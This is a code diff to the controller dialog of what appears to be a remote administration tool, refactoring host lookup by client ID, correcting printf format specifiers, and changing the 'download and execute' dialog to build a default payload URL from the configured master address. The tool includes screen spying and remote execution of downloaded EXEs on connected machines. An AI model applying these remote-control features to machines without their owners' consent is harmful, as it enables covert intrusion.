@@ -2886,7 +2886,8 @@ LRESULT CMy2015RemoteDlg::UpdateUserEvent(WPARAM wParam, LPARAM lParam)
 
 void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
 {
-    auto host = FindHost(ctx);
+    auto clientID = ctx->GetClientID();
+    auto host = FindHost(clientID);
     if (!host) {
         // TODO: 不要简单地主动关闭连接
         ctx->CancelIO();
@@ -2902,7 +2903,7 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
     {
         BOOL authorized = AuthorizeClient(hb.SN, hb.Passcode, hb.PwdHmac);
         if (authorized) {
-            Mprintf("%s HMAC 校验成功: %lld\n", hb.Passcode, hb.PwdHmac);
+            Mprintf("%s HMAC 校验成功: %llu\n", hb.Passcode, hb.PwdHmac);
             m_ClientMap->SetClientMapInteger(host->GetClientID(), MAP_AUTH, TRUE);
             std::string tip = std::string(hb.Passcode) + " 授权成功: ";
             tip += std::to_string(hb.PwdHmac) + "[" + std::string(ctx->GetClientData(ONLINELIST_IP)) + "]";
@@ -2917,10 +2918,9 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
 
     CLock L(m_cs);
     int n = m_CList_Online.GetItemCount();
-    context* cur = (context*)ctx;
     for (int i = 0; i < n; ++i) {
         context* id = (context*)m_CList_Online.GetItemData(i);
-        if (cur->IsEqual(id)) {
+        if (clientID == id->GetClientID()) {
             m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
             if (hb.Ping > 0)
                 m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
@@ -2930,17 +2930,7 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
     }
 }
 
-context* CMy2015RemoteDlg::FindHost(context* ctx)
-{
-    CLock L(m_cs);
-    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
-        if (ctx->IsEqual(*i)) {
-            return ctx;
-        }
-    }
-    return NULL;
-}
-
+// 根据套接字端口寻找对应的在线主机, 返回在线主机 context
 context* CMy2015RemoteDlg::FindHost(int port)
 {
     CLock L(m_cs);
@@ -2952,6 +2942,7 @@ context* CMy2015RemoteDlg::FindHost(int port)
     return NULL;
 }
 
+// 根据ID寻找对应的在线主机, 返回在线主机 context
 context* CMy2015RemoteDlg::FindHost(uint64_t id)
 {
     CLock L(m_cs);
@@ -3024,7 +3015,7 @@ LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
     if (dlg) {
         if (GetRemoteWindow(dlg))
             return dlg->UpdateContext(ContextObject);
-        Mprintf("收到远程桌面打开消息, 对话框已经销毁: %lld\n", dlgID);
+        Mprintf("收到远程桌面打开消息, 对话框已经销毁: %llu\n", dlgID);
     }
     return OpenDialog<CScreenSpyDlg, IDD_DIALOG_SCREEN_SPY, SW_SHOWMAXIMIZED>(wParam, lParam);
 }
@@ -4282,7 +4273,9 @@ void CMy2015RemoteDlg::OnExecuteDownload()
 {
     CInputDialog dlg(this);
     dlg.Init("下载执行", "远程下载地址:");
-    dlg.m_str = "https://127.0.0.1/example.exe";
+    auto ip = THIS_CFG.GetStr("settings", "master", "127.0.0.1");
+    dlg.m_str = BuildPayloadUrl(ip.c_str(), "example.exe");
+    dlg.m_sTipInfo = "请将EXE放在\"Payloads\"目录或输入下载地址。";
 
     if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
         return;
